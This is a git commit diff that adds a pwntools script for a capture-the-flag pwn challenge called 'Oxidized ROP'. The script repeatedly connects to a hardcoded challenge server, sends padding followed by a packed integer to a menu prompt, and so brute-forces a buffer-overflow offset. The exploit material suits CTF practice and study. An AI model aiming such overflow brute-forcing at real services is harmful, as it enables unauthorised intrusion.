482f036773980951472913d58bdd71c05eff0c0d
szhan21 <shunda.zhang@intel.com>
2023-04-08 17:07:31 +0800

    Brute force Oxidized ROP.

--- ctf/pwn/OxidizedROP/pwn_oxidized_rop/dec.py
+++ ctf/pwn/OxidizedROP/pwn_oxidized_rop/dec.py
@@ -1,6 +1,20 @@
 from pwn import *
 
+context.log_level = 'debug'
+
 ip, port = '134.122.104.91', 32475
 
-io = remote(ip, port)
-io.close()
+payload = p32(123456)
+#print(payload)
+
+for i in range(1, 200-4+1, 1):
+	s = b'A'*i + payload
+	io = remote(ip, port)
+	io.recvuntil(b'Selection:')
+	io.sendline(b'1')
+	io.recvuntil(b'Statement (max 200 characters):')
+	io.sendline(s)
+	io.recvuntil(b'Selection:')
+	io.sendline(b'2')
+	io.close()
+
